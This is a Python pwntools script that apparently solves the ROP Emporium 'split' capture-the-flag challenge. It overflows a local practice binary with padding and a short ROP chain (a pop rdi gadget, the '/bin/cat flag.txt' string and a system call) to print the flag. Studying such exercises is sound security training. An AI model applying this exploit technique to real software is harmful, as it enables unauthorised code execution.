from pwn import *
import re

flag_pattern = r'ROPE\{[^\}]+\}'

e = ELF("./split")

payload=b'A'*40 #offset
payload+=p64(0x004007c3) #gadget pop rdi ; ret          #
payload+=p64(0x601060) #address to "/bin/cat flag.txt"  #   ropchain
payload+=p64(0x000000000040074b) #address to syscall    #

p = e.process()
print(p.recvuntil(b'> '))
p.send(payload)
flag=p.recvall()

flag_match = re.search(flag_pattern, flag.decode())

if flag_match:
    flag = flag_match.group()
    print("FLAG:", flag)
else:
    print("Aucun flag trouvé dans l'output.")